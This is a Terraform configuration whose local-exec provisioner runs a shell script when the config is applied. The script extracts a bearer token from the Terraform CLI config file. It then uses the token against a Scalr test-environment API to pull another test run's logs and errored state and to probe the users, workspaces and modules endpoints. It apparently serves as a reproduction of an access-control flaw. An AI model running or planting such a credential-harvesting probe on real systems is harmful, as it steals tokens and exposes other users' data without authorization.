resource "terraform_data" "probe" {
  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command     = <<-EOT
      B="https://qaenv-method-p.masster.testenv.scalr.dev/api/iacp/v3"
      TOK=$(grep -oE 'ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "$TF_CLI_CONFIG_FILE" | head -1)
      st() { curl -s -o /dev/null -w '%%{http_code}' -H "Authorization: Bearer $TOK" -H "Prefer: profile=internal" "$@"; }
      body() { curl -s -H "Authorization: Bearer $TOK" -H "Prefer: profile=internal" "$@"; }
      link() { grep -oE "\"$1\": ?\"[^\"]*\"" | head -1 | sed -E 's/^[^:]+: ?"//; s/"$//'; }
      echo "REPRO token_found=$([ -n "$TOK" ] && echo yes || echo no) tr2=$(st $B/test-runs/trun-v0pghtrfok8vgujfv)"
      OUT=$(body $B/test-runs/trun-v0pghtrfok8vgujfv | link output); ERR=$(body $B/test-runs/trun-v0pghtrfok8vgujfv | link download-errored-state)
      echo "REPRO tr2_log=$(st -L "$OUT") log_marker=$(body -L "$OUT" | grep -c r10marker)"
      echo "REPRO tr2_errored_state=$(st -L "$ERR") state_marker=$(body -L "$ERR" | tar -xzO 2>/dev/null | grep -c r10marker)"
      echo "REPRO modules=$(st $B/modules) namespaces=$(st $B/module-namespaces) users=$(st $B/users) workspaces=$(st $B/workspaces)"
      exit 1
    EOT
  }
}
